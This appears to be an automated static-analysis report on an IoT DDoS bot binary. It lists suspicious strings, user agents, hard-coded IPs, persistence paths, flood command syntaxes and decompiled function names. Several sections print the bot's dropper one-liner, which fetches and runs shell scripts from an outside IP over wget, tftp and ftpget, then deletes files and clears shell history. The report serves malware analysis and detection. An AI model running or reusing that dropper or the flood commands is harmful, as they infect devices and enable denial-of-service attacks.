=============================================================================
========	BINARY ID :4ca1ac75c3b50d5dbd3e593e8fb44ebdd530b91e==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :2495
SUPSCPECTED LINES COUNT :178
SUPSCPECTED STRINGS COUNT (DISTINCT) :32
SUPSCPECTED STRINGS WEIGHT :125
SUSPECT STRING SCORE : [125 / 150] 83%
USER AGENTS STRINGS COUNT :36
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :1
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\r\n
telnet
NetICs
bintec
netadmin
attack
system
NETWORK
extendnet
NetVCR
netgear
synnet
netopia
/dev/netslink/
/usr/
/bin/sh
PING
%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
Failed opening raw socket.
Invalid flag "%s"
REP STOPPING!
HTTP
HTTP %s Flooding %s:%d for %d seconds
UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>
TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)
STD <target> <port> <time>
/proc/net/route
/etc/rc.d/rc.local
fork failed\n
\e[1;36m [ROOT] \e[1;32mBASSBOOTS!! \e[0;35m[IP] \e[1;33m| \e[1;32m%s \e[0;35m[Arch] \e[1;33m| \e[1;32m%s\e[34m
STOLENBOTS
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
/etc/config/hosts
fdopen_pids
libc/sysdeps/linux/powerpc/vfork.S
fork.c
getpid.c
kill.c
sigprocmask.c
waitpid.c
spec_flags.4074
strstr.c
_string_syserrmsgs.c
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname_r.c
connect.c
socket.c
rand.c
random.c
randtbl
random_r.c
random_poly_info
__socketcall.c
inet_aton.c
dnslookup.c
get_hosts_byname_r.c
inet_pton4
inet_ntop4
read_etc_hosts_r.c
__read_etc_hosts_r
__socketcall
waitpid
random
connect
GetRandomPublicIP
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
__libc_getpid
makeRandomStr
sendHTTP
GetRandomIP
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
__GI_srandom_r
kill
__GI_sigprocmask
inet_addr
connectTimeout
__GI_kill
strstr
init_rand
rand
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__get_hosts_byname_r
__GI_inet_pton
gethostbyname
__vfork
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_strstr
__GI_connect
inet_ntop
__GI_inet_aton
__GI_vfork
__GI_inet_addr
__libc_connect
pids
sigprocmask
`\bᾐ᐀羀렀耸Ѐ뾀᐀왌舱H╓8Ȁᾰ᠀ᾀ쀀T㸄ͼ砃H嶂恼砛ᾰᨀ羁밀㼹᠀सЀ捽硛Ѽ砃ｋ槵恼砛耯
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)
Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00
Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0
%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
188.166.150.230:123
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
%d.%d.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/net/route
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\r\n
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\r\n
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 75293
+++TOTAL FUNCTIONS 			:251
+++LINES PER FUNCTION RATIO 	: 299.972111553785
+++SUSPECTED LINES COUNT 	: 1165
+++SUSPECTED LINES RATIO 	: 1.54728859256505
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 75293
+++WHILE (TRUE) LINES			: 11695
+++WHILE (TRUE) LINES RATION		:15.5326524378096%
+++WHILE (TRUE) LOOPS COUNT		: 202
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/",
        "/opt/"
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0, (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0, (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0, (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0, (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
        int32_t v202 = __libc_open((int32_t)"/proc/net/route", 0); // 0x10006928
    int32_t v190 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x10006bac
    char * v192 = "/etc/rc.d/rc.local";
        v191 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        v192 = "/etc/rc.conf";
                            int32_t v219 = __GI_fopen((int32_t)v192, (int32_t)&v218); // 0x10006d20
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen(0, (char *)-1);
int32_t _stdio_fopen(int32_t a1, char * a2) {
    int32_t v196 = __libc_open((int32_t)"/dev/null", a2); // 0x1000c120
    int32_t v194 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v193); // 0x1000e0b0
        int32_t v198 = __GI_fopen((int32_t)"/etc/config/resolv.conf", v197); // 0x1000e0c8
    int32_t v196 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v195); // 0x1000f6f8
        result = __GI_fopen((int32_t)"/etc/config/hosts", v197);
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
        "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",

    char (*v146)[20] = "188.166.150.230:123";

                                                                szprintf(v203, (int32_t)"%d.%d.%d.%d", v198);

    inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |2   |4592    |353           |542         |
----------------------------------------------------------------------------------------------
main                                              |0   |834     |87            |484         |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |6   |1072    |70            |175         |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |6   |961     |65            |627         |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |4   |3967    |55            |3683        |
----------------------------------------------------------------------------------------------
GetRandomPublicIP                                 |1   |408     |39            |210         |
----------------------------------------------------------------------------------------------
fdpopen                                           |2   |509     |38            |0           |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |452     |33            |130         |
----------------------------------------------------------------------------------------------
prints                                            |4   |632     |30            |33          |
----------------------------------------------------------------------------------------------
sendUDP                                           |7   |407     |26            |97          |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |9   |656     |25            |271         |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |2   |1046    |19            |822         |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |341     |17            |107         |
----------------------------------------------------------------------------------------------
sleep                                             |1   |502     |14            |0           |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |2   |781     |13            |0           |
----------------------------------------------------------------------------------------------
__open_nameservers                                |0   |421     |13            |198         |
----------------------------------------------------------------------------------------------
print                                             |3   |536     |11            |315         |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |3   |354     |10            |115         |
----------------------------------------------------------------------------------------------
__heap_free                                       |3   |329     |10            |12          |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |6   |415     |9             |18          |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |574     |9             |216         |
----------------------------------------------------------------------------------------------
inet_pton                                         |3   |602     |9             |269         |
----------------------------------------------------------------------------------------------
printi                                            |7   |309     |8             |18          |
----------------------------------------------------------------------------------------------
recvLine                                          |4   |333     |7             |105         |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |264     |7             |53          |
----------------------------------------------------------------------------------------------
negotiate                                         |4   |250     |7             |0           |
----------------------------------------------------------------------------------------------
sendSTD                                           |3   |234     |7             |23          |
----------------------------------------------------------------------------------------------
fdpclose                                          |1   |249     |6             |23          |
----------------------------------------------------------------------------------------------
srandom_r                                         |0   |286     |5             |41          |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |2   |321     |5             |62          |
----------------------------------------------------------------------------------------------
readUntil                                         |7   |309     |5             |99          |
----------------------------------------------------------------------------------------------
_init                                             |0   |295     |5             |0           |
----------------------------------------------------------------------------------------------
strstr                                            |3   |333     |5             |115         |
----------------------------------------------------------------------------------------------
getcwd                                            |2   |367     |4             |0           |
----------------------------------------------------------------------------------------------
connectTimeout                                    |5   |265     |4             |31          |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |0   |910     |4             |687         |
----------------------------------------------------------------------------------------------
socket_connect                                    |3   |233     |4             |0           |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |3   |321     |4             |89          |
----------------------------------------------------------------------------------------------
Rootsprintf                                       |3   |205     |3             |0           |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |235     |3             |0           |
----------------------------------------------------------------------------------------------
listFork                                          |0   |228     |3             |20          |
----------------------------------------------------------------------------------------------
realloc                                           |1   |265     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |245     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_strncat                                      |4   |291     |3             |62          |
----------------------------------------------------------------------------------------------
strnlen                                           |1   |301     |3             |67          |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |306     |3             |82          |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |1   |470     |3             |269         |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |231     |2             |17          |
----------------------------------------------------------------------------------------------
__GI_strlen                                       |0   |282     |2             |24          |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |267     |2             |61          |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |207     |2             |0           |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |2   |295     |2             |85          |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |3   |298     |2             |69          |
----------------------------------------------------------------------------------------------
abort                                             |1   |316     |2             |0           |
----------------------------------------------------------------------------------------------
memrchr                                           |4   |321     |2             |84          |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |307     |2             |27          |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |5   |315     |2             |52          |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |2   |235     |2             |30          |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |221     |2             |17          |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |0   |262     |2             |28          |
----------------------------------------------------------------------------------------------
inet_aton                                         |1   |286     |2             |73          |
----------------------------------------------------------------------------------------------
_stdio_term                                       |2   |249     |2             |30          |
----------------------------------------------------------------------------------------------
execl                                             |6   |267     |2             |53          |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |228     |2             |0           |
----------------------------------------------------------------------------------------------
trim                                              |1   |260     |2             |60          |
----------------------------------------------------------------------------------------------
__libc_connect                                    |3   |197     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |205     |1             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |201     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |197     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |1   |233     |1             |26          |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |2   |220     |1             |20          |
----------------------------------------------------------------------------------------------
malloc                                            |0   |281     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |200     |1             |0           |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |205     |1             |0           |
----------------------------------------------------------------------------------------------
GetRandomIP                                       |1   |199     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_creat                                      |1   |198     |1             |0           |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |2   |212     |1             |0           |
----------------------------------------------------------------------------------------------
strcasestr                                        |3   |228     |1             |28          |
----------------------------------------------------------------------------------------------
random                                            |0   |203     |1             |0           |
----------------------------------------------------------------------------------------------
getsockopt                                        |5   |197     |1             |0           |
----------------------------------------------------------------------------------------------
zprintf                                           |2   |198     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |0   |303     |1             |37          |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |249     |1             |44          |
----------------------------------------------------------------------------------------------
free                                              |0   |252     |1             |0           |
----------------------------------------------------------------------------------------------
socket                                            |3   |197     |1             |0           |
----------------------------------------------------------------------------------------------
advance_state                                     |2   |205     |1             |0           |
----------------------------------------------------------------------------------------------
fdgets                                            |3   |223     |1             |21          |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |208     |1             |9           |
----------------------------------------------------------------------------------------------
rawmemchr                                         |3   |281     |1             |10          |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |198     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |4   |197     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |1   |245     |1             |35          |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |0   |212     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |198     |1             |0           |
----------------------------------------------------------------------------------------------
rand                                              |0   |198     |1             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |0   |289     |1             |4           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |197     |1             |0           |
----------------------------------------------------------------------------------------------
fgets                                             |3   |213     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |2   |267     |1             |61          |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |7   |197     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |2   |198     |1             |0           |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |6   |200     |1             |0           |
----------------------------------------------------------------------------------------------
__heap_alloc                                      |2   |263     |1             |46          |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |2   |238     |1             |36          |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |0   |386     |1             |115         |
----------------------------------------------------------------------------------------------
getdtablesize                                     |1   |205     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |3   |199     |1             |0           |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |2   |198     |1             |0           |
----------------------------------------------------------------------------------------------
__raise                                           |1   |198     |1             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |3   |198     |1             |0           |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |200     |1             |0           |
----------------------------------------------------------------------------------------------
tcpcsum                                           |3   |203     |1             |0           |
----------------------------------------------------------------------------------------------
sprintf                                           |8   |200     |1             |0           |
----------------------------------------------------------------------------------------------
__length_dotted                                   |0   |225     |1             |17          |
----------------------------------------------------------------------------------------------
__libc_recv                                       |4   |197     |1             |0           |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |2   |296     |1             |66          |
----------------------------------------------------------------------------------------------
__heap_alloc_at                                   |3   |251     |1             |45          |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |273     |1             |0           |
----------------------------------------------------------------------------------------------
_charpad                                          |3   |224     |1             |17          |
----------------------------------------------------------------------------------------------
isatty                                            |1   |199     |1             |0           |
----------------------------------------------------------------------------------------------
memcpy                                            |0   |389     |1             |91          |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |209     |1             |0           |
----------------------------------------------------------------------------------------------
parseHex                                          |1   |225     |1             |18          |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |1   |279     |1             |52          |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |2   |220     |1             |17          |
----------------------------------------------------------------------------------------------
__GI_fcntl64                                      |1   |211     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs                                        |2   |213     |0             |0           |
----------------------------------------------------------------------------------------------
contains_response                                 |1   |204     |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |1   |208     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |1   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |1   |214     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |2   |482     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |233     |0             |0           |
----------------------------------------------------------------------------------------------
call___do_global_dtors_aux                        |0   |199     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |0   |217     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |2   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_open                                       |2   |215     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |210     |0             |0           |
----------------------------------------------------------------------------------------------
csum                                              |5   |349     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fork                                       |0   |208     |0             |0           |
----------------------------------------------------------------------------------------------
wait4                                             |1   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |3   |277     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_answer                                   |4   |229     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area                             |4   |206     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |0   |198     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |2   |199     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |1   |211     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |2   |240     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tolower                                      |1   |201     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |2   |205     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |3   |262     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |1   |200     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_lseek64                                    |4   |215     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |202     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_poll                                       |3   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |0   |198     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |0   |211     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |224     |0             |0           |
----------------------------------------------------------------------------------------------
getBuild                                          |0   |198     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |210     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigprocmask                                  |3   |233     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |2   |269     |0             |0           |
----------------------------------------------------------------------------------------------
reset_telstate                                    |2   |198     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |6   |208     |0             |0           |
----------------------------------------------------------------------------------------------
